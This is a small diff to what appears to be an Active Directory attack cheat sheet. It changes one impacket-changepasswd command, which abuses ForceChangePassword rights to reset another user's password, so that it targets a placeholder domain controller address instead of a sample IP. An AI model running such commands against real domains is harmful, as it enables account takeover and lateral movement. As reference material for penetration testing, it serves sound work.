@@ -1,7 +1,7 @@
 ## First Degree Object Control / ForceChangePassword 
 
 ```
-impacket-changepasswd -reset -protocol smb-samr 'corp.local/bob@10.10.10.10' -newpass 'NewPassword123!' -altuser 'corp.local/alice' -altpass 'Password123!'
+impacket-changepasswd -reset -protocol smb-samr 'corp.local/bob@DCIP' -newpass 'NewPassword123!' -altuser 'corp.local/alice' -altpass 'Password123!'
 ```
 
 ---
